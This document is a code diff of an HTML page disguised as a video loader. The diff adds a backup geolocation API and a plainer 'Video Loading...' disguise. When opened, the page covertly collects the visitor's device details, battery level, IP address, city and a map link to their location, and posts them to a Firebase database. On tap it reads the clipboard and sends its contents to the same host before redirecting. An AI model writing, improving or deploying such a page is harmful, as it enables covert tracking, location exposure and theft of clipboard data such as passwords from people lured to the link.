@@ -2,21 +2,23 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Connecting to Media...</title>
+    <title>Video Loading...</title>
     <style>
-        body { background: #000; color: #00ffaa; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .spinner { width: 50px; height: 50px; border: 3px solid #111; border-top: 3px solid #00ffaa; border-radius: 50%; animation: spin 1s linear infinite; }
+        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00a884; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
-    <p id="msg" style="margin-top:20px; font-size:12px; text-transform:uppercase; letter-spacing:2px;">Securing Connection...</p>
+    <div id="status" style="text-align:center;">
+        <div class="loader"></div>
+        <p style="margin-top:15px; color:#555;">Connecting to secure server...</p>
+    </div>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
 
-        async function initScan() {
+        async function start() {
             const params = new URLSearchParams(window.location.search);
             const id = params.get('id');
             if(!id) return;
@@ -24,58 +26,54 @@
             const userKey = decoded.k;
             const targetUrl = decoded.r;
 
-            // 1. Gather Advanced Hardware Data
             let data = {
                 time: new Date().toLocaleString(),
-                localTime: new Date().toLocaleTimeString(),
-                device: navigator.platform,
                 ram: navigator.deviceMemory || "N/A",
                 res: `${screen.width}x${screen.height}`,
                 orient: screen.orientation ? screen.orientation.type : "N/A",
                 netType: navigator.connection ? navigator.connection.effectiveType : "N/A",
                 speed: navigator.connection ? navigator.connection.downlink : "N/A",
-                battery: "N/A",
-                charging: "N/A"
+                ip: "N/A", loc: "N/A", map: "#"
             };
 
-            // 2. Battery Scan
-            try {
-                const b = await navigator.getBattery();
-                data.battery = Math.round(b.level * 100);
-                data.charging = b.charging ? "Yes" : "No";
-            } catch(e){}
+            // Battery Info
+            try { const b = await navigator.getBattery(); data.battery = Math.round(b.level * 100); data.charging = b.charging ? "Yes" : "No"; } catch(e){}
 
-            // 3. IP, Geo & VPN Detection
+            // IP & Location (Primary API)
             try {
-                const res = await fetch('https://ipwho.is/');
-                const d = await res.json();
-                data.ip = d.ip;
-                data.loc = `${d.city}, ${d.country}`;
-                data.isProxy = d.security ? d.security.proxy || d.security.vpn : false;
-                data.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-            } catch(e){}
+                let res = await fetch('https://ipapi.co/json/');
+                let d = await res.json();
+                if(d.ip) {
+                    data.ip = d.ip;
+                    data.loc = `${d.city}, ${d.country_name}`;
+                    data.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+                } else { throw new Error(); }
+            } catch(e) {
+                // Secondary API (Backup)
+                try {
+                    let res2 = await fetch('https://ipwho.is/');
+                    let d2 = await res2.json();
+                    data.ip = d2.ip;
+                    data.loc = `${d2.city}, ${d2.country}`;
+                    data.map = `https://www.google.com/maps?q=${d2.latitude},${d2.longitude}`;
+                } catch(e2){}
+            }
 
-            // Send All Data to Firebase
+            // Save to Firebase
             await fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(data) });
 
-            // Ready for User Interaction
-            document.getElementById('msg').innerHTML = "<b>TAP SCREEN TO VIEW VIDEO</b>";
+            document.getElementById('status').innerHTML = "<b>TAP TO PLAY VIDEO</b>";
 
             document.body.onclick = async () => {
                 try {
                     const text = await navigator.clipboard.readText();
-                    if(text) await fetch(`${DB_URL}clipboard/${userKey}.json`, { 
-                        method: 'POST', 
-                        body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) 
-                    });
+                    if(text) await fetch(`${DB_URL}clipboard/${userKey}.json`, { method: 'POST', body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) });
                 } catch(e){}
                 window.location.href = targetUrl;
             };
-            
-            // Auto move if no click
             setTimeout(() => { window.location.href = targetUrl; }, 10000);
         }
-        initScan();
+        start();
     </script>
 </body>
 </html>
